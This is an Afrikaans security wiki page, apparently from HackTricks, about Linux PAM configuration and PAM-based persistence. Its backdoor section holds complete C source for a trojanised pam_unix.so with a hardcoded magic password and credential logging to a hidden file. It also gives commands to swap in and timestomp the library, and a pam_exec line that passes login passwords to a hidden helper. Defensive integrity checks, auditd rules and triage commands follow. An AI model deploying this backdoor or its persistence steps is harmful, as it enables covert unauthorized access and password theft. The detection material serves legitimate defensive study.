# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Basiese inligting

**PAM (Pluggable Authentication Modules)** tree op as ’n sekuriteitsmeganisme wat **die identiteit verifieer van gebruikers wat toegang tot rekenaardienste probeer verkry**, en hul toegang volgens verskeie kriteria beheer. Dit is soortgelyk aan ’n digitale hekwagter wat verseker dat slegs gemagtigde gebruikers spesifieke dienste kan gebruik, terwyl hul gebruik moontlik beperk word om te voorkom dat die stelsel oorlaai word.

#### Konfigurasielêers

- **Solaris** ondersteun die verouderde sentrale lêer `/etc/pam.conf`, maar huidige riglyne verkies dienslêers onder `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Linux-stelsels** verkies ’n gidsbenadering en stoor diensspesifieke konfigurasies in `/etc/pam.d`. Byvoorbeeld, die konfigurasielêer vir die aanmeldingsdiens is by `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

’n Voorbeeld van ’n PAM-konfigurasie vir die aanmeldingsdiens kan soos volg lyk:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **PAM-bestuursdomeine**

Hierdie domeine, of bestuursgroepe, sluit **auth**, **account**, **password** en **session** in. Elkeen is verantwoordelik vir verskillende aspekte van die verifikasie- en sessiebestuursproses:<sup>[[1]](#references)</sup>

- **Auth**: Bevestig die gebruiker se identiteit, dikwels deur ’n wagwoord aan te vra.
- **Account**: Hanteer rekeningverifikasie en kontroleer voorwaardes soos groeplidmaatskap of tydsbeperkings.
- **Password**: Bestuur wagwoordopdaterings, insluitend kompleksiteitskontroles en voorkoming van woordeboekaanvalle.
- **Session**: Bestuur aksies wanneer ’n dienssessie begin of eindig, soos om gidse te monteer of hulpbronlimiete te stel.

#### **PAM-modulekontroles**

Kontroles bepaal hoe die module op sukses of mislukking reageer en beïnvloed die algehele verifikasieproses. Dit sluit die volgende in:<sup>[[1]](#references)</sup>

- **Required**: ’n Mislukking van ’n vereiste module lei uiteindelik tot mislukking, maar eers nadat alle daaropvolgende modules nagegaan is.
- **Requisite**: Beëindig die proses onmiddellik wanneer dit misluk.
- **Sufficient**: As geen vroeëre `required`-module misluk het nie, keer sukses onmiddellik terug en word die oorblywende modules in dieselfde bestuursgroep oorgeslaan.
- **Optional**: Veroorsaak slegs mislukking as dit die enigste module in die stapel is.

#### Aanvalssemantiek wat saak maak

Wanneer jy PAM ontleed of wysig, bepaal die **ligging van ’n ingevoegde reël** watter stapel dit sien:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` en `substack` haal reëls uit ander lêers, dus kan die wysiging van `sshd` slegs SSH beïnvloed, terwyl die wysiging van `system-auth`, `common-auth` of ’n ander gedeelde stapel verskeie dienste tegelyk beïnvloed.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM ondersteun ook kontroles tussen vierkantige hakies, soos `[success=1 default=ignore]`. Dit kan misbruik word om **een of meer modules oor te slaan** ná ’n suksesvolle pasgemaakte kontrole, pleks daarvan om `pam_unix.so` sigbaar te vervang.<sup>[[1]](#references)</sup>
- Die `module-path` kan **absoluut** wees (`/usr/lib/security/pam_custom.so`) of **relatief** tot die verstek-PAM-modulegids. Op moderne Linux-stelsels is die werklike gidse dikwels `/lib/security`, `/lib64/security`, `/usr/lib/security` of multiarch-paaie soos `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Kort praktiese wenk: karteer altyd die **volledige diensgrafiek** voordat jy ’n wysiging aanbring. Byvoorbeeld, `sshd -> password-auth -> system-auth` op sommige distros, of `sshd -> system-remote-login -> system-login -> system-auth` op ander, beteken dat dieselfde enkelreël-implantaat ’n veel wyer uitwerking kan hê as wat bedoel is.<sup>[[1]](#references)[[13]](#references)</sup>

’n Pasgemaakte `auth`-module kan ’n interaktiewe uitdaging by `sudo` voeg ná die rekeningwagwoord. Gaan die effektiewe `/etc/pam.d/sudo`-stapel, ingeslote beleid, module-argumente en toestemmings op enige verwysde plaaslike datalêer na voordat jy die uitdaging handmatig ondersoek. ’n Leesbare woordelys vir die uitdaging omseil nie die wagwoordkontrole of skep ’n sudoers-toekenning nie. ’n Bevoorregte oorgang vereis steeds die korrekte rekeningverifikasie, voltooiing van elke vereiste PAM-stap en ’n sudo-reël wat root-toegang moontlik maak; outomatiese enumerasie behoort nie die uitdaging te aktiveer nie.

Vir die verouderde Ubuntu-[`pam_motd`-eienaarskapfout (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832), ondersoek die werklike `libpam-modules`-bouweergawe en of ’n aanmeldingsdiens die betrokke sessiemodule aanroep. Ubuntu het dit reggestel in **1.1.0-2ubuntu1.1** vir 9.10 en **1.1.1-2ubuntu5** vir 10.04 LTS; ander weergawes of verskaffer-terugpoorte vereis hul eie pakketbeoordeling. Volgens die gerapporteerde aanvalspad moes die oproeper hul tuisgids se `.cache` met ’n simboliese skakel vervang en daarna ’n PAM-aanmelding aktiveer, wat veroorsaak het dat die ou module die eienaarskap van ’n beskermde teiken verander. ’n `.cache`-inskrywing, `pam_motd.so`-reël of ou kernweergawe alleen bewys nie dat die stelsel blootgestel is nie; kontroleer beheer oor die tuisgids, die effektiewe moduleweergawe, aanmeldingsbereikbaarheid, hantering van simboliese skakels en teikentoestemmings sonder om lêers te vervang of ’n aanmelding tydens passiewe enumerasie te begin. Sien [Ubuntu se sekuriteitskennisgewing](https://ubuntu.com/security/notices/USN-959-1).

#### Voorbeeldscenario

In ’n opstelling met verskeie auth-modules volg die proses ’n streng volgorde. As die `pam_securetty`-module bepaal dat die aanmeldterminal nie gemagtig is nie, word root-aanmeldings geblokkeer, maar alle modules word steeds verwerk weens die module se "required"-status. Die `pam_env`-module stel omgewingsveranderlikes, wat moontlik die gebruikerservaring verbeter. Die `pam_ldap`- en `pam_unix`-modules werk saam om die gebruiker te verifieer, met `pam_unix` wat probeer om ’n voorheen verskafde wagwoord te gebruik. Dit verbeter die doeltreffendheid en buigsaamheid van verifikasiemetodes.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` in ’n diensstapel

`pam_permit.so` gee sukses terug vir PAM-kontroles. As ’n gebruiker met laer voorregte ’n diens se effektiewe PAM-beleid kan wysig, kan die invoeging van hierdie module met ’n kontrolevlag wat die verifikasiestapel kortsluit, die wagwoordkontrole vir daardie diens verwyder. Vir `sudo`, ondersoek `/etc/pam.d/sudo` en enige ingeslote `common-auth`- of `system-auth`-lêer voordat jy besluit watter dienste geraak word. ’n PAM-verifikasie-omseiling **gee nie** ’n nuwe sudoers-reël nie; die gebruiker moet steeds gemagtig wees om die versoekte opdrag uit te voer. Gaan die reëlvolgorde en enige vroeëre `required`-mislukkings na eerder as om aan te neem dat ’n enkele `sufficient pam_permit.so`-reël altyd slaag.

## PAM backdoor – Haak by `pam_unix.so` in

’n Klassieke volhardingstruuk in Linux-omgewings met hoë waarde is om die **wettige PAM-biblioteek met ’n getrojaniseerde plaasvervanger te verruil**. Op ’n gasheer waarvan die PAM-stapel `pam_unix.so` laai, kan SSH- of konsoleverifikasie die `pam_sm_authenticate()`-ingangspunt aanroep; ’n kwaadwillige plaasvervanger kan aanmeldbewyse vaslê of ’n *magic*-wagwoordomseiling implementeer.<sup>[[2]](#references)[[11]](#references)</sup>

### Samestellingsvinniggids
Die skets hieronder gebruik Linux-PAM se `pam_sm_authenticate()`-diensingangspunt en `pam_get_authtok()` om toegang tot die verifikasietoken te kry.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Voorbeeld van ’n `pam_unix.so`-trojan</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Kompileer en stealth-replace (die vervangings-/timestomp-patroon word deur Unit 42 gedokumenteer). Pas sowel die rugsteunpad wat hardgekodeer is in die wrapper as die opdragte hieronder aan by die teiken se werklike PAM-modulegids:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSec-wenke
1. **Atomiese oorskryf** – skryf ’n volledige library na ’n tydelike lêer en hernoem dit dan na die teikenplek om te voorkom dat ’n gedeeltelik geskryfde authentication module agterbly.
2. ’n Pad soos `/usr/bin/.dbus.log` is in Unit 42 se AuthDoor-ontleding waargeneem, en is dus ook ’n nuttige jagaanwyser.<sup>[[2]](#references)</sup>
3. Behou die entry points wat deur die PAM-stack verwag word (byvoorbeeld `pam_sm_authenticate` en `pam_sm_setcred`) sodat ander bestuursbewerkings kan voortgaan om te werk.<sup>[[11]](#references)[[18]](#references)</sup>

### Opsporing
Vir pakketintegriteitkontroles verifieer RPM die metadata van geïnstalleerde lêers, rapporteer `debsums -s` kontrolesomfoute, en raadpleeg `dpkg -S` in die triage-blok pakketeienaarskap; die audit watch-sintaksis teken skryfbewerkings en kenmerkveranderings aan ’n pad aan.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Vergelyk die MD5/SHA256 van `pam_unix.so` met die distro-pakket.
* Gebruik `rpm -V pam` of `debsums -s libpam-modules` om vervangde libraries raak te sien sonder om hashes handmatig te bereken.
* Kyk vir wêreldskryfbare of ongewone eienaarskap onder `/lib/security/`.
* `auditd`-reël: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Soek in PAM-konfigurasies vir onverwagte modules: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Daardie `pam_`-grep mis persoonlike modules met ander `.so`-basisname. Hersien die **aktiewe** `auth`-, `account`-, `password`- en `session`-reëls in `/etc/pam.d` (en `/etc/pam.conf` waar dit gebruik word), insluitend hul control flag en enige ingeslote stack. ’n Onbekende module wat as `auth sufficient` voor die gewone wagwoordkontrole geplaas is, verdien ’n hersiening van pakketeienaarskap en die binary; [PAM se control-sintaksis](https://man7.org/linux/man-pages/man5/pam.d.5.html) kan veroorsaak dat sukses daardie deel van die stack vroeg beëindig. ’n Modulenaam, ongewone tydstempel of `nodelay`-opsie bewys op sigself nie ’n omseiling nie. As gedrag op ’n timing leak dui, ondersoek eers die implementering en die diens se bereikbaarheid; moenie tydens roetine-enumerasie herhaaldelik authentication-raaiskote indien nie.

### Vinnige triage-opdragte (ná kompromittering of threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Misbruik van `pam_exec` vir volharding
In plaas daarvan om `pam_unix.so` te vervang, is ’n minder ingrypende benadering om ’n `pam_exec`-reël by `/etc/pam.d/sshd` te voeg, sodat ’n aanroep wat daardie PAM-reël bereik ’n hulpprogram uitvoer terwyl die normale stapel ongeskonde bly.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` ontvang PAM-metadata in omgewingsveranderlikes soos `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` en `PAM_TYPE`. Met `expose_authtok` kan die helper tydens die `auth`- of `password`-fase tot `PAM_MAX_RESP_SIZE` grepe van die wagwoord vanaf `stdin` lees. As jy wil hê die helper moet met die effektiewe UID in plaas van die werklike UID loop, voeg `seteuid` by.<sup>[[4]](#references)</sup>

Praktiese notas volg die moduletipes en `type=`-filter wat vir `pam_exec` gedokumenteer is:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` is beter vir **aksies ná aanmelding**, soos om sokkette te heropen of ’n losstaande daemon te laat loop.
- `auth optional pam_exec.so quiet expose_authtok ...` is die gewone keuse vir **vaslegging van aanmeldbewyse**, omdat dit loop voordat die sessie oopmaak.
- `type=session` of `type=auth` kan gebruik word om uitvoering tot ’n spesifieke PAM-fase te beperk en onnodige dubbele uitvoering te vermy.

Vir ’n voorregte-oudit is ’n absolute pad na ’n `pam_exec.so`-helper wat die huidige gebruiker kan skryf ’n moontlike kandidaat, selfs wanneer die lêer as slegs-byvoegbaar (`a`) gemerk is: [die attribuut laat byvoegings toe](https://man7.org/linux/man-pages/man1/chattr.1.html), wat genoeg kan wees om die latere gedrag van ’n shell script te verander. Bevestig eers dat die PAM-diens en gebeurtenis wel daardie reël bereik, dat die helper en sy ouerpad vertrou kan word, en dat die opdrag onder ’n meer bevoorregte identiteit loop; [`seteuid` verander watter PAM UID gebruik word](https://man7.org/linux/man-pages/man8/pam_exec.8.html). ’n Skryfbare lêer of `lsattr`-resultaat alleen bewys nie bevoorregte uitvoering nie.

### Distro-nutsgoed oorleef: `authselect`

Op RHEL- en Fedora-familiestelsels wat `authselect` gebruik, kan direkte wysigings aan gegenereerde lêers soos `/etc/pam.d/system-auth` of `/etc/pam.d/password-auth` **deur `authselect` oorskryf word**. Vir volharding wysig operateurs dikwels die aktiewe pasgemaakte profiel onder `/etc/authselect/custom/<profile>/` en kies dit daarna weer.<sup>[[5]](#references)[[19]](#references)</sup>

Tipiese werkvloei wanneer jy root het:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Dit is belangrik vir beide aanvalle en triage: as `/etc/pam.d/system-auth` die banier `Generated by authselect` en `Do not modify this file manually` bevat, kan die werklike persistence-punt onder `/etc/authselect/custom/` wees eerder as in `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Onlangse tradecraft wat in die natuur waargeneem is

Onlangse beriggewing in 2025 oor die **Plague** Linux-backdoor het gewys hoe dieselfde kernidee verder gevoer is: ’n kwaadwillige PAM-komponent met ’n **statiese omseilwagwoord**, plus die skoonmaak van SSH-verwante omgewingsveranderlikes en shell-geskiedenis (`HISTFILE=/dev/null`) om sessiespore ná aanmelding te verminder.<sup>[[3]](#references)</sup> Dit is ’n nuttige jagpatroon omdat die backdoor-logika in PAM kan voorkom, terwyl die stealth-artefakte eers **ná** suksesvolle verifikasie verskyn.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Die geheime operateur se speelboek: Infiltrasie van globale telekommunikasienetwerke - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: ’n Nuut ontdekte PAM-gebaseerde backdoor vir Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Konfigurasie van gebruikerverifikasie met authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian-manblaaie](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux-manbladsy](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian-manblaaie](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Bestuur van verifikasie in Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Stelselvlak-verifikasiegids - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu-pakketlêerlys: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian-manblaaie](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Veranderinge/Maak Authselect verpligtend - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
